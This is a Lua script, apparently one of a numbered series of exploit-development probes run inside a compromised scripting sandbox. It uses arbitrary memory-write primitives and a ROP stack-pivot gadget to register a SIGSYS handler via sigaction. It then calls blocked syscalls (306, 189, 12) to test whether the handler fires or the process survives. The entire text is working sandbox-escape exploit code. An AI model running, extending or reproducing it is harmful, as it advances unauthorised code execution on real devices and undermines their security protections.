-- CRASH_CLASS: MODERATE
-- PROBE 1010a: what exactly happens when a lethal syscall is called with SIGSYS caught?
-- 1009a showed the process surviving 306/189/337/570 but with no pivot-handler report, so
-- the failure is not a delivered signal reaching our handler. Print the real error text and
-- compare against a working syscall through the same wrapper.

print("=== PROBE 1010a: SIGSYS ERROR TEXT ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
print(string.format("[0] pid=%u", to_num(mk(20)())))

local ph = gadgets.stack_pivot[1]
local GA = to_num(ph.gadget_addr)
local sa = memory.alloc(0x28)
pcall(function() memory.write_qword(sa, GA) end)
pcall(function() memory.write_qword(sa+0x20, 0x4) end)
local _, n = pcall(function() return sa:tonumber() end)
local sa_a = to_num(n)
print(string.format("[1] sa=0x%X handler=0x%X", sa_a, GA))
local ok, rv = pcall(function() return syscall.sigaction(12, sa, 0) end)
print(string.format("[2] sigaction(12) rv=%s", ok and tostring(to_num(rv)) or "ERR"))

local function try(tag, n, nargs)
    local okc, e1, e2 = pcall(function()
        local f = mk(n)
        if nargs == 0 then return f() end
        local b = memory.alloc(0x100)
        return f(uint64(as_addr(b)), uint64(0x100), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    local s1 = tostring(e1); if #s1 > 70 then s1 = s1:sub(1,70) end
    print(string.format("[%s] ok=%s ret=%s err=%s", tag, tostring(okc), okc and tostring(to_num(e1)) or "", okc and "" or s1))
    print(string.format("[%s] alive pid=%u", tag, to_num(mk(20)())))
end

try("N", 20, 0)
try("A", 306, 6)
try("B", 189, 6)
try("C", 12, 6)
print("=== COMPLETE ===")
